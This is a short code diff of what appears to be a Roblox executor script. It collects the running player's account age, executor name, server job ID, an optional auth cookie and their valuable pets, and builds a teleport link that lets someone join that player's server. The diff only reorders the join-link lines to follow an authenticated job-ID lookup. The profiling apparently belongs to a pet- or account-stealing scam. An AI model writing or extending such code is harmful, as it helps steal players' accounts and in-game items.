@@ -642,9 +642,6 @@ local plr = game.Players.LocalPlayer
 local accage = plr.AccountAge
 local ExecutorValue = identifyexecutor() or "Unknown"
 local placeId = game.PlaceId
-local jobId = game.JobId
-local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. bestJobId
-local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. bestJobId .. "\")"
 local VersionValue = "1.12 (Added values)"
 
 local function GetRealJobIdWithAuth()
@@ -751,6 +748,9 @@ end
 if getgenv().Cookie then
     local realJobId = FindRealJobId()
 end
+
+local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. bestJobId
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. bestJobId .. "\")"
 
 -- Get valuable pets info
 local valuableCount, totalValue, topPets = getValuablePetsInfo()
